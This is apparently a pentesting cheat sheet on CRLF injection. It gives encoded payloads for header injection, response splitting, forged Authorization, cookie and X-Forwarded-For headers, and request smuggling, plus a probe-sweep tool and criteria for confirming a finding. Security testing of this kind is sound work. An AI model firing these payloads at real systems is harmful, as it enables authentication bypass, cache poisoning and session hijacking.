# CRLF injection — control characters inside a request

## The shape — a value that lands in a header or URL

A user-controlled value is interpolated into a request line, a header, or a
URL without encoding — the `%0d%0a` survives into the outbound request and
lets you append headers, or a whole second request.

## The header-fold — `name: value\r\nInjected: x`

```text
GET /page?host=example.com%0d%0aX-Injected:%201 HTTP/1.1
```

If `host` lands raw inside a header line, the `%0d%0a` ends the header and
`X-Injected: 1` becomes a new header on the outbound request. Useful for
injecting `Authorization`, `X-Forwarded-For`, `Cookie`, or a host-override
header the proxy honors.

## The body-fold — `value\r\n\r\n<smuggled-request>`

```text
GET /page?host=example.com%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20t%0d%0a%0d%0a
```

`%0d%0a%0d%0a` terminates the headers — everything after is a body or a
second request — depending on whether the parser keeps reading.

## The common folds

| Encoding | Bytes | What it lands as |
|---|---|---|
| `%0d%0a` | `\r\n` | header terminator |
| `%0d%0a%0d%0a` | `\r\n\r\n` | end-of-headers |
| `%0a` | `\n` | LF only — some parsers accept |
| `%0d` | `\r` | CR only |
| `%250d%250a` | `%0d%0a` literal | double-encoded — decodes once |
| `%e5%98%8a` | multibyte UTF-8 | a rare parser maps it to `\n` |
| `%u000a` | `\n` | some unicode decoders |
| `\\r\\n` | literal text | if the parser unescapes `\\` |
| `\r\n ` | with trailing space | header-continuation — the next line is a folded continuation of the SAME header |

## The header-continuation — `name: v\r\n folded`

```text
GET /?host=ex.com%0d%0a%20X-Inj:%201
```

`%20` = a leading space → the ` X-Inj: 1` is a CONTINUATION of the previous
header (obs-fold) — the parser joins them — the injected text lands inside
the previous header's value, not as a new header. Use to smuggle content
into an existing header's value (e.g., a `Cookie` header's value).

## The Set-Cookie fold — `value\r\nSet-Cookie: session=...`

```text
GET /?name=x%0d%0aSet-Cookie:%20admin=1
```

If `name` lands in a `Set-Cookie` line the response sets an extra cookie —
response-splitting. If the value lands in a redirect `Location:` header
the response becomes a redirect + body — a response-split fold.

## The Response-Splitting — one request, two responses

```text
GET /?name=%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<html>admin</html>
```

The `%0d%0a%0d%0a` ends the first response's headers — the body becomes
`<html>admin</html>` — but the parser still emits the ORIGINAL response
tail — the client sees TWO responses — a response-split. Caches and
proxies can poison on this.

## The Header-Injection — `X-Forwarded-For` smuggle

```text
GET /?ip=1.2.3.4%0d%0aX-Forwarded-For:%20127.0.0.1
```

If `ip` lands raw into a header, the fold injects `X-Forwarded-For:
127.0.0.1` — the app reads the spoofed IP — useful for IP-allowlist
bypass — `internal-routes.md`.

## The Cookie-injection — `value\r\nCookie: admin=1`

```text
GET /?host=ex.com%0d%0aCookie:%20admin=1
```

The outbound request carries an extra Cookie — session-fixation if the
app reads it.

## The Host-header smuggle — `host=a.com%0d%0aHost: internal`

```text
GET /?host=a.com%0d%0aHost:%20internal
```

Two `Host:` headers — one parser uses the first, the other uses the last —
an internal-host smuggle.

## The Authorization fold — `host=a%0d%0aAuthorization: Basic ...`

```text
GET /?host=a%0d%0aAuthorization:%20Basic%20YWRtaW46YWRtaW4=
```

The outbound request carries a forged Authorization — if the backend
trusts it → auth bypass.

## The common CL-smuggle via CRLF — `CL: N\r\n\r\n<smuggle>`

```text
GET /?len=5%0d%0a%0d%0aPOST%20/admin%20HTTP/1.1%0d%0aHost:%20t
```

The `%0d%0a%0d%0a` ends the headers — the body IS the smuggled request.

## The fold-matrix — the probe sweep

`tools/web/crlf_probe.py --url "http://t/?host={M}" --value "ex.com"` —
fires the fold matrix (`%0d%0a`, `%0d%0a%0d%0a`, lone `%0d`, lone `%0a`,
`%250d`, `%e5%98%8a`) into the value slot — each variant graded against
the baseline: upstream-error text, folded marker echo, or status delta.
A 302, generic 400, or timeout does not count.

## The evidence bar — what confirms

- the injected header APPEARS in a response or a follow-up observation
- the second request's status line is attributable — a 404/500 that the
  smuggled path causes
- a `Location` header carries the fold — the redirect header itself
  splits

A plain `200` with the same body does not confirm — could be the filter
stripped the fold.
